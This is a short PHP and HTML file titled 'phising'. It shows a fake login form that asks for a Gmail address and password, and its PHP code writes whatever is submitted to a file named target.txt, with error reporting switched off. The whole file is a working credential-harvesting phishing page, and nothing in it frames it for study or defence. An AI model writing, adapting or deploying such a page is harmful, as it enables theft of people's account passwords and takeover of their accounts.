<?php
error_reporting(0);
$username=$_POST["gmail"];
$password=$_POST["password"];
if (isset($_POST["button"])) {
    $file= fopen("target.txt", "w");
    fwrite($file, "gmail:");
    fwrite($file, $username);
    fwrite($file, ",");
    fwrite($file, "password:");
    fwrite($file, $password);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>phising</title>
</head>
<body>
    <form method="POST" action="login.php">
        <h1>login</h1>
        gmail:
        <input type="text" name="gmail"><br>
        password:
        <input type="password" name="password"><br>
        <input type="submit" name="button" value="login">
    </form>
</body>
</html>